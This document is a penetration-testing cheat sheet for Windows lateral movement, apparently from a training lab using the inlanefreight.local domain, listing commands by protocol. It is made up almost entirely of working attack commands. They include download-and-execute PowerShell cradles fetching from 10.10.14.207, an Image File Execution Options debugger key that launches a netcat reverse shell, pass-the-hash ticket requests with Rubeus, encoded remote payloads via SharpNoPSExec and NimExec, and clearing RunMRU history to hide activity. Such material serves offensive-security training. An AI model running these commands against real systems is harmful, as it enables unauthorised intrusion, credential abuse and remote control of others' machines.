# Windows Lateral Movement


---
## Page 1

Remote Desktop Protocol (RDP)
Command
Description
mstsc.exe
Open Remote Desktop
Connection client
mstsc.exe /restrictedAdmin
Open Remote Desktop
Connection client in
Restricted Admin mode
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v
DisableRestrictedAdmin
Query
DisableRestrictedAdmin
value in LSA settings
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v
DisableRestrictedAdmin /d 0 /t REG_DWORD
Disable Restricted Admin
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v
DisableRestrictedAdmin /d 1 /t REG_DWORD
Enable Restricted Admin
.\chisel.exe client <ATTACK HOST>:<PORT> R:socks
Connect to chisel server
with SOCKS proxy
.\Rubeus.exe createnetonly /program:powershell.exe /show
Create sacrificial logon
session with Rubeus
.\Rubeus.exe asktgt /user:<USER> /rc4:<HASH>
/domain:inlanefreight.local /ptt
Ask for TGT using
specified user and RC4
hash with Rubeus
WINDOWS LATERAL MOVEMENTS
CHEAT SHEET

---
## Page 2

Command
Description
.\SharpRDP.exe computername=srv01 command="powershell.exe
IEX(New-Object
Net.WebClient).DownloadString('http://10.10.14.207/s')"
username=inlanefreight\<USER> password=<PASS>
Execute PowerShell
command on SRV01 via
RDP using SharpRDP
with specified credentials
wget -Uri
http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -
OutFile CleanRunMRU.cs
Download Program.cs
from specified URI
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
.\CleanRunMRU.cs
Compile
CleanRunMRU.cs using
C# compiler
.\CleanRunMRU.exe clearall
Execute
CleanRunMRU.exe with
clearall argument
Server Message Block (SMB)
Command
Description
.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\<USER> -p <PASS> cmd
Execute
command on
remote server
using PsExec
.\SharpNoPSExec.exe --target=<TARGETIP> --
payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -
nop -e ...SNIP...AbwBzAGUAKAApAA=="
Execute
SharpNoPSExec
with target and
payload
parameters
.\NimExec -u <USER> -d inlanefreight.local -p <PASS> -t <TARGETIP>
-c "cmd.exe /c powershell -e
JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
Execute
NimExec with
specified user,
domain,
password,
target, and
command

---
## Page 3

Command
Description
reg.exe add
"\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options\msedge.exe" /v
Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe &&
nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"
Add debugger
key to
msedge.exe in
registry
reg.exe add
HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
/v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
Enable SMB
Guest Share
folder access
Windows Management Instrumentation (WMI)
Command
Description
wmic /node:<TARGETIP> os get
Caption,CSDVersion,OSArchitecture,Version
Get OS details
from remote
machine using
WMIC
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGETIP>
| Select-Object Caption, CSDVersion, OSArchitecture, Version
Get OS details
from remote
machine using
PowerShell
wmic /node:<TARGETIP> process call create "notepad.exe"
Execute
notepad.exe
on remote
machine using
WMIC
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList
"notepad.exe" -ComputerName <TARGETIP>
Execute
notepad.exe
on remote
machine using
PowerShell
and WMI
wmic /user:username /password:password /node:<TARGETIP> os get
Caption,CSDVersion,OSArchitecture,Version
Query OS
details with
specified
credentials
using WMIC

---
## Page 4

Command
Description
$credential = New-Object System.Management.Automation.PSCredential("
<USER>", (ConvertTo-SecureString "<PASS>" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList
"powershell IEX(New-Object
Net.WebClient).DownloadString('http://10.10.14.207/s')" -
ComputerName <TARGETIP>
Execute
PowerShell
command with
specified
credentials
using WMI
Windows Remote Management (WinRM)
Command
Description
Invoke-Command -ComputerName <TARGETIP> -ScriptBlock {
hostname;whoami }
Invoke command
on remote server
using WinRM
$username = "<USER>"; $password = "<PASS>";$securePassword =
ConvertTo-SecureString $password -AsPlainText -Force;$credential =
New-Object System.Management.Automation.PSCredential ($username,
$securePassword);Invoke-Command -ComputerName <TARGETIP> -
Credential $credential -ScriptBlock { whoami; hostname }
Invoke command
on remote server
with specified
credentials using
WinRM
winrs -r:<TARGETIP> "powershell -c whoami;hostname"
Execute
PowerShell
commands on
remote server
using WinRS
winrs /remote:<TARGETIP> /username:<USER> /password:<PASS>
"powershell -c whoami;hostname"
Execute
PowerShell
commands on
remote server
with specified
credentials using
WinRS
$sessionSRV02 = New-PSSession -ComputerName <TARGETIP> -Credential
$credential;Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\
<USER>\Desktop\Sample.txt' -Destination 'C:\Users\
<USER>\Desktop\Sample.txt' -Verbose;Copy-Item -FromSession
$sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -
Destination 'C:\Users\<USER>\Desktop\host.txt' -Verbose;Enter-
PSSession $sessionSRV02
Create
PowerShell
session, copy
files, and enter
session on
remote server
using WinRM

---
## Page 5

Distributed Component Object Model (DCOM)
Command
Description
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-
Object{Get-ItemProperty -Path $_.PSPath | Where-Object
{$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty
PSChildName}
Query
ShellWindows
CLSID in
registry using
PowerShell
$shell =
[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-
F2A1-11D1-8455-00A0C91F3880","<TARGETIP>"))
Create instance
of
ShellWindows
using specified
CLSID on
remote server
Secure Shell (SSH)
Command
Description
ssh ambioris@<TARGET>
Connect to SRV01 using SSH
ssh -i C:\helen_id_rsa -l
<USER>@inlanefreight.local -p <TARGET_PORT>
<TARGET>
Connect to SRV01 using SSH with
specified key, username, and port
icacls.exe C:\helen_id_rsa
Display or modify ACLs for
C:\helen_id_rsa
Remote Management Tools
Command
Description
Test-NetConnection -ComputerName <TARGET> -Port
5900
Test connection to <TARGET> on
port 5900
reg query HKLM\SOFTWARE\TightVNC\Server /s
Query TightVNC server settings in
registry